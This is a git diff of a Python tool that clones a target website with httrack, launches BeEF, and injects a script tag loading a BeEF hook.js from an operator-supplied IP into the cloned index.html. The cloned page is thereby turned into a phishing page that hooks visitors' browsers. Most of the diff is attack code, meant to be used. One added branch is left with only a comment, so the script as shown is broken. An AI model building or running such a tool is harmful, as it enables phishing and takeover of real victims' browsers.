@@ -15,6 +15,7 @@ import sys;
 import os;
 import subprocess;
 from subprocess import check_output;
+import fileinput;
 
 
 
@@ -66,21 +67,21 @@ def DependencyCheck(possible_packages):
 
 def ArgCheck(arg):
     for x in range(0, len(sys.argv)): #For every item in the arguments
-        y = sys.argv[x] #The argument text
+        y = sys.argv[x]; #The argument text
         if y == arg: #If the argument is the same as the expected
-            return x #Return the position of the argument
-    return False #Else, return False
+            return x; #Return the position of the argument
+    return False; #Else, return False
 
 def WebsiteClone(url, folder): #httrack usage - 'httrack <URL> -O <FOLDER>'
-    instance = subprocess.Popen(["httrack", url, "-O", folder], stdout=subprocess.PIPE)
+    instance = subprocess.Popen(["httrack", url, "-O", folder], stdout=subprocess.PIPE);
     while True:
-        output = instance.stdout.readline()
+        output = instance.stdout.readline();
         if output == '' and instance.poll() is not None:
-            break
+            break;
         if output:
-            print(output.strip())
-    rc = instance.poll()
-    return rc
+            print(output.strip());
+    rc = instance.poll();
+    return rc;
 
 def BeEFStart():
     instance = subprocess.Popen(["sudo", "beef-xss"], stdout=subprocess.PIPE)
@@ -93,12 +94,30 @@ def BeEFStart():
     rc = instance.poll()
     return rc
 
+def fileInject(hookIP, url, outputFolder):
+    beefString = ("http://%s:3000/hook.js" % hookIP)
+    if "https://" in url:
+        cutDownUrl = url.replace("https://", "");
+    elif "http://" in url:
+        cutDownUrl = url.replace("http://", "");
+    filepath = ("%s/%s/index.html" % (outputFolder, cutDownUrl))
+    file = open(filepath, "r");
+    filedata = file.read();
+    file.close()
+    filedata = filedata.replace("<head>", "<head>\n<script src='%s'></script>" % beefString)
+    file = open(filepath, "w");
+    file.write(filedata);
+    file.close()
+
 
 
 #Check Arguments
 if len(sys.argv) == 1:
     print("%s%s%s%s" % (colour_header.purple, ascii_art, colour_header.white, args)); #Print ascii_art in Purple, followed by available args.
     print("%sError: no arguments given%s" % (colour_header.red, colour_header.white));
+    sys.exit();
+elif os.geteuid() != 0:
+    print("%sThis script requires root privilleges. Please append 'sudo' to the beinning of your command.%s" % (colour_header.red, colour_header.white)); #Throw error
     sys.exit();
 elif "-h" in sys.argv:
         print("%s%s%s%s" % (colour_header.purple, ascii_art, colour_header.white, args)); #Print ascii_art in Purple, followed by available args.
@@ -109,13 +128,20 @@ elif "-u" in sys.argv:
     pos += 1 #Position of the url
     url = sys.argv[pos] #Declare the url
     if "-o" in sys.argv:
-        posOut = ArgCheck("-o")
-        posOut += 1
-        outputFolder = sys.argv[posOut]
-        WebsiteClone(url, outputFolder)
-        print("\nFinished Cloning")
-        print("\nNow starting beef-xss. beef-xss requires root.")
-        BeEFStart()
+        if "-p" in sys.argv:
+            ipOut = ArgCheck("-p");
+            ipOut += 1;
+            localIP = sys.argv[ipOut];
+            posOut = ArgCheck("-o");
+            posOut += 1;
+            outputFolder = sys.argv[posOut];
+            WebsiteClone(url, outputFolder);
+            print("\nFinished Cloning");
+            print("\nNow starting beef-xss.");
+            BeEFStart();
+            fileInject(localIP, url, outputFolder);
+        elif "-p" not in sys.argv:
+            #Local IP for beef-xss error
     elif "-o" not in sys.argv:
         print("%sError: no output path specified%s" % (colour_header.red, colour_header.white)); #Throw error
 elif "-u" not in sys.argv:
